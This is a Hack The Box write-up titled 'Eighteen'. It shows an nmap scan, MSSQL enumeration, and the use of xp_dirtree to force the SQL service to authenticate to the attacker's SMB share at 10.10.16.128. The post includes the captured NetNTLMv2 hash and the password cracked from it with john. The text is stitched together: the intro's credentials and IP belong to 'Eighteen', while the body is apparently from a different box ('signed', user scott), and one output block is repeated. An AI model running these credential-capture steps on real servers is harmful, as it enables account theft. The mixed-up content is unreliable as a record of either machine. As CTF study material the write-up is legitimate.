---
title: Eighteen
date: 2026-05-28
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
lastmod: 2026-06-04T03:24:23.771Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Eighteen" >}}

***

> As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: kevin / iNa2we6haRj2gaw!

# Recon

### \[\[PORT & IP SCAN]]

The comprehensive Nmap scan of the target host (`10.129.5.186`) across all 65,535 ports revealed exactly two open TCP ports: port **80** (HTTP), suggesting a web server is running, and port **1433** (ms-sql-s), which is the standard port for a Microsoft SQL Server database. All other 65,533 scanned ports were returned as filtered, meaning they did not respond to the scan's SYN probes.

```
tester@parrot]─[~/Desktop/HTB/Eighteen]
└──╼ $sudo nmap  -p-  -vv -reason -T 5  -o openPort.txt 10.129.5.186 --min-rate 1000
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-29 16:27 HKT
Initiating Ping Scan at 16:27
Scanning 10.129.5.186 [4 ports]
Completed Ping Scan at 16:27, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:27
Completed Parallel DNS resolution of 1 host. at 16:27, 0.00s elapsed
Initiating SYN Stealth Scan at 16:27
Scanning 10.129.5.186 [65535 ports]
Discovered open port 80/tcp on 10.129.5.186
Increasing send delay for 10.129.5.186 from 0 to 5 due to 11 out of 18 dropped probes since last increase.
SYN Stealth Scan Timing: About 23.29% done; ETC: 16:30 (0:01:42 remaining)
SYN Stealth Scan Timing: About 46.16% done; ETC: 16:30 (0:01:11 remaining)
Discovered open port 1433/tcp on 10.129.5.186
SYN Stealth Scan Timing: About 69.03% done; ETC: 16:30 (0:00:41 remaining)
Completed SYN Stealth Scan at 16:30, 131.71s elapsed (65535 total ports)
Nmap scan report for 10.129.5.186
Host is up, received echo-reply ttl 127 (0.24s latency).
Scanned at 2026-05-29 16:27:54 HKT for 132s
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE  REASON
80/tcp   open  http     syn-ack ttl 127
1433/tcp open  ms-sql-s syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 132.07 seconds
           Raw packets sent: 131167 (5.771MB) | Rcvd: 47 (2.052KB)

```

### mssql 1433

I’ll check for impersonation and linked servers, but neither show anything interesting:

```
SQL (scott  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
SQL (scott  guest@master)> enum_links
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL      

Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   

```

Listing the logins, it’s just scott and the sa (admin) account:

```
SQL (scott  guest@master)> enum_logins
name    type_desc   is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
-----   ---------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa      SQL_LOGIN             0          1               0             0            0              0           0           0           0   

scott   SQL_LOGIN             0          0               0             0            0              0           0           0           0   

```

`xp_dirtree` will let me enumerate the filesystem. I can try to read the contents of `C:\`:

```
SQL (scott  guest@master)> xp_dirtree "C:\"
subdirectory   depth   file   
------------   -----   ----   
```

MSSQL provides the mechanism to get information about domain users. For example, I can look up the SID for the domain Administrator account:

```
SQL (scott  guest@master)> SELECT SUSER_SID('SIGNED\Administrator');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000'   

```

I can also go the other way:

```
SQL (scott  guest@master)> SELECT SUSER_SNAME(0x0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000);
                       
--------------------   
SIGNED\Administrator   

```

This SID is in binary format, but the 0xf4010000 is RID 500 in little-endian hex. If I want to see who has 501 (0xf5010000), MSSQL will show:

```
SQL (scott  guest@master)> SELECT SUSER_SNAME(0x0105000000000005150000005b7bb0f398aa2245ad4a1ca4f5010000);
               
------------   
SIGNED\Guest   

```

### Auth as mssqlsvc

I’m going to use `xp_dirtree` to try to list a directory from an SMB share I control. That will cause MSSQL to try to authenticate to my share (using the service account that MSSQL is running under), where I can capture the NetNTLMv2 challenge / response (hash) and try to crack it. I’ll start [Responder](https://github.com/lgandx/Responder):

```
SQL (scott  guest@master)> xp_dirtree \\10.10.16.128\share
subdirectory   depth   file   
------------   -----   ----  
```

```
[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.128]
    Responder IPv6             [dead:beef:4::107e]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-W3ZXZ1CTV76]
    Responder Domain Name      [KR56.LOCAL]
    Responder DCE-RPC Port     [48185]

[+] Listening for events...

/usr/share/responder/packets.py:218: SyntaxWarning: invalid escape sequence '\W'
  SplitFQDN =  re.split('\W+', DNSName) # split the ldap.tcp.blah.blah.blah.domain.tld
/usr/share/responder/servers/SMB.py:212: SyntaxWarning: invalid escape sequence '\?'
  if data[8:10] == b"\x72\x00" and re.search(b"SMB 2.\?\?\?", data):
/usr/share/responder/servers/SMB.py:250: SyntaxWarning: invalid escape sequence '\?'
  if data[8:10] == b'\x72\x00' and data[4:5] == b'\xff' and re.search(b'SMB 2.\?\?\?', data) == None:
[!] Error starting SSL server on port 5986, check permissions or other servers running.
[!] Error starting SSL server on port 443, check permissions or other servers running.
^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[[SMB] NTLMv2-SSP Client   : 10.129.242.173[[B^[[B
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:7d07f98f6b804540:0D51BEE890F8EDBAAD9643D4EAC7C631:010100000000000080E1B91213F4DC0121979CA1E41B64DB00000000020008004B0052003500360001001E00570049004E002D00570033005A0058005A0031004300540056003700360004003400570049004E002D00570033005A0058005A003100430054005600370036002E004B005200350036002E004C004F00430041004C00030014004B005200350036002E004C004F00430041004C00050014004B005200350036002E004C004F00430041004C000700080080E1B91213F4DC0106000400020000000800300030000000000000000000000000300000C43CF03D946905B2A522C43F1350114953B3FAEE7623DC4064C7A3373547EA9D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100320038000000000000000000

```

```
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.128]
    Responder IPv6             [dead:beef:4::107e]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-W3ZXZ1CTV76]
    Responder Domain Name      [KR56.LOCAL]
    Responder DCE-RPC Port     [48185]

[+] Listening for events...

/usr/share/responder/packets.py:218: SyntaxWarning: invalid escape sequence '\W'
  SplitFQDN =  re.split('\W+', DNSName) # split the ldap.tcp.blah.blah.blah.domain.tld
/usr/share/responder/servers/SMB.py:212: SyntaxWarning: invalid escape sequence '\?'
  if data[8:10] == b"\x72\x00" and re.search(b"SMB 2.\?\?\?", data):
/usr/share/responder/servers/SMB.py:250: SyntaxWarning: invalid escape sequence '\?'
  if data[8:10] == b'\x72\x00' and data[4:5] == b'\xff' and re.search(b'SMB 2.\?\?\?', data) == None:
[!] Error starting SSL server on port 5986, check permissions or other servers running.
[!] Error starting SSL server on port 443, check permissions or other servers running.
^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[[SMB] NTLMv2-SSP Client   : 10.129.242.173[[B^[[B
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:7d07f98f6b804540:0D51BEE890F8EDBAAD9643D4EAC7C631:010100000000000080E1B91213F4DC0121979CA1E41B64DB00000000020008004B0052003500360001001E00570049004E002D00570033005A0058005A0031004300540056003700360004003400570049004E002D00570033005A0058005A003100430054005600370036002E004B005200350036002E004C004F00430041004C00030014004B005200350036002E004C004F00430041004C00050014004B005200350036002E004C004F00430041004C000700080080E1B91213F4DC0106000400020000000800300030000000000000000000000000300000C43CF03D946905B2A522C43F1350114953B3FAEE7623DC4064C7A3373547EA9D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100320038000000000000000000

```

```
┌─[tester@parrot]─[~/Desktop/HTB/signed]
└──╼ $john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt mssql.hashes 
Created directory: /home/tester/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)     
1g 0:00:00:03 DONE (2026-06-04 11:20) 0.3125g/s 1403Kp/s 1403Kc/s 1403KC/s purcitititya..punkgod666
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
